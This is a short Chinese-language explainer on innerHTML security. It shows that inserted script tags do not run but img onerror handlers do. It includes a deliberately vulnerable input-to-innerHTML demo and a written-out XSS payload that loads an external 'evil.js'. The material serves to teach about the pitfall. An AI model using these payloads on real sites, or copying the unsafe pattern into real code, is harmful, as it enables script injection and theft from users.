# `innerHTML` 的安全性


## 乍看起来比较安全
HTML5 specifies that a `<script>` tag inserted with `innerHTML`
[should not execute](https://www.w3.org/TR/2008/WD-html5-20080610/dom.html#innerhtml0)
```js
document.body.innerHTML = '<script>alert(666)<\/script>'; // 脚本不会被执行
```


## 但是执行脚本并不一定需要 `<script>`
```js
document.body.innerHTML = '<img src="x" onerror="alert(666)" />';
```

一个较完整的例子：
```html
<input type="text" placeholder="插入你想发送的的文章代码" id="code" />
<input type="button" value="插入文章" id="insert" />
<p id="article"></p>
<script>
document.querySelector('#insert').addEventListener('click', function(){
    document.querySelector('#article').innerHTML = document.querySelector('#code').value;
});
</script>
```
如果用户输入 `<img src="x" style="display:none" onerror="var ele = document.createElement(&quot;script&quot;); ele.src = &quot;evil.js&quot;; document.body.appendChild(ele);" />`，页面上会生成一个不可见的图片，并引入一个外部的恶意脚本 `evil.js`，在这个脚本就可以构造更复杂的 XSS。
